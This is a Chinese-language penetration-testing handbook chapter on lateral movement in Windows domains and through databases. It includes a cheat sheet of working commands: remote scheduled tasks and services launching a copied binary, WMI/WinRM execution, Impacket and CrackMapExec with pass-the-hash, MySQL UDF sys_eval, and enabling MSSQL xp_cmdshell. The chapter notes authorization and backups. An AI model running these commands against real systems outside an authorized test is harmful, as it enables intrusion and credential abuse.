# 第6章 横向移动

## Windows 常见方式

- 远程任务计划：`schtasks /S ...`
- 远程服务：`sc \\host create/start`
- WMI：`wmic /node:... process call create`
- WinRM：`winrs`、evil-winrm、CrackMapExec
- psexec、SCShell、wmiexec、smbexec
- 哈希传递：mimikatz `sekurlsa::pth`，注意 Remote UAC 和受限管理模式。

```cmd
net use \\192.168.159.19 /u:DOMAIN\user PASSWORD
schtasks /create /S 192.168.159.19 /U DOMAIN\user /P PASSWORD /SC ONCE /TN t1 /TR "C:\ProgramData\tool.exe"
schtasks /run /S 192.168.159.19 /U DOMAIN\user /P PASSWORD /TN t1
```

## 数据库横向

- MySQL UDF：`plugin_dir`、写 DLL、`CREATE FUNCTION ... SONAME`。
- MSSQL：`xp_cmdshell`、OLE Automation、CLR。
- Redis：写文件、主从复制、模块加载；注意 Redis 版本和权限。
- mdut 可统一管理多种数据库。

## 注意事项

- 445 被封时仍可评估 135、5985、3389 等通道。
- 不要修改生产数据；UDF/CLR/触发器操作必须先备份并确认回滚。
- 横向移动前确认目标授权范围和账号锁定风险。
## 命令速查

### Windows 远程执行

```cmd
net use \\<TARGET> /u:<DOMAIN>\<USER> <PASSWORD>
copy tool.exe \\<TARGET>\c$\ProgramData\tool.exe

schtasks /create /S <TARGET> /U <DOMAIN>\<USER> /P <PASSWORD> /SC ONCE /TN <TASK> /TR "C:\ProgramData\tool.exe"
schtasks /run /S <TARGET> /U <DOMAIN>\<USER> /P <PASSWORD> /TN <TASK>

sc \\<TARGET> create <SERVICE> binpath= "C:\ProgramData\tool.exe" start= auto
sc \\<TARGET> start <SERVICE>

wmic /node:<TARGET> /user:<DOMAIN>\<USER> /password:<PASSWORD> process call create "cmd.exe /c whoami > C:\ProgramData\out.txt"
winrs -r:http://<TARGET>:5985 -u:<DOMAIN>\<USER> -p:<PASSWORD> "cmd.exe /c whoami"
```

### Impacket / CME

```bash
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -codec gbk
wmiexec.py <DOMAIN>/<USER>@<TARGET> -hashes :<NTHASH> -codec gbk
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
crackmapexec smb <TARGET> -d <DOMAIN> -u <USER> -H <NTHASH> -x whoami
```

### 数据库

```sql
-- MySQL：确认插件目录
SHOW VARIABLES LIKE '%plugin%';
-- 写入 UDF 后注册
CREATE FUNCTION sys_eval RETURNS STRING SONAME '<UDF>.dll';
SELECT sys_eval('whoami');
DROP FUNCTION sys_eval;
```

```sql
-- MSSQL：开启 xp_cmdshell（确认授权和变更记录）
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

```bash
# Redis：仅测试环境；save 会写盘
redis-cli -h <TARGET> config get dir
redis-cli -h <TARGET> config get dbfilename
```

提示：横向移动前确认账号锁定、SMB 签名、Remote UAC、目标业务影响。
